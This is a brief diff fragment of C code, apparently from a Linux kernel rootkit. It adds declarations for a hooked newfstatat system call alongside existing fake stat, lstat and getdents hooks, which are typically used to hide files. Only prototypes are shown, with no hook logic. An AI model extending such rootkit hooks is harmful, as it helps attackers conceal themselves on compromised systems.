@@ -87,6 +87,9 @@ asmlinkage long (*real_stat)(const char __user *filename, struct __old_kernel_st
 asmlinkage long fake_lstat(const char __user *filename, struct __old_kernel_stat __user *statbuf);
 asmlinkage long (*real_lstat)(const char __user *filename, struct __old_kernel_stat __user *statbuf);
 
+asmlinkage long fake_newfstatat(int dfd, const char __user *filename,struct stat __user *statbuf, int flag);
+asmlinkage long (*real_newfstatat)(int dfd, const char __user *filename,struct stat __user *statbuf, int flag);
+
 /* getdents */
 asmlinkage long fake_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
 asmlinkage long (*real_getdents)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
